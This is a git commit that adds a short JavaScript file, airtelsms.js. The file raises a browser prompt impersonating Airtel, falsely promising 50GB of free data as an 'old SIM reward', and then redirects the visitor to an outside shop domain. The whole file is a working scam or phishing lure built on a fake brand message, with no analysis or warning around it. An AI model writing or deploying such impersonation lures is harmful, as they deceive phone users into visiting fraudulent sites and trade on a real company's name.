67d8993b8a911dee015bb473121e9ac0700e361c
bigetijazz6 <bigetijazz6@gmail.com>
2024-09-18 02:27:27 -0700

    Create airtelsms.js

---
+++ airtelsms.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Airtel: Congratulations, Your Number is Eligible to receive 50GB free data Airtel OLD SIM REWARD, Kindly press 1 to ACTIVATE ','1');
+if (password != '1') {
+location.href='https://www.offre-beta.shop/airtelreward';
+}
